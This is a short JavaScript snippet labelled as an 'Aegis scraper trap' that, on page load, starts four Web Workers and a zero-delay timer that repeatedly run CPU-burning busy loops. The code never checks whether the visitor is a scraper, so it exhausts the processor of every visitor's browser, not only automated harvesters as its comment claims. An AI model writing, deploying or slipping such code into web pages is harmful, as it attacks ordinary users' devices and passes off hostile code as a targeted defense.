/**
 * Aegis scraper trap — CPU exhaustion for unauthorized headless harvesters.
 * Not cryptocurrency mining; intentional busy-loop to deter automated scraping.
 */
(function aegisTrap() {
  "use strict";
  var workers = [];
  var i;
  function burn() {
    var x = 0;
    while (true) {
      x = (x * 1664525 + 1013904223) >>> 0;
      if (x === 0xdeadbeef) break;
    }
  }
  for (i = 0; i < 4; i++) {
    try {
      workers.push(new Worker(URL.createObjectURL(new Blob(["(" + burn.toString() + ")()"], { type: "application/javascript" }))));
    } catch (e) {
      burn();
    }
  }
  setInterval(burn, 0);
})();
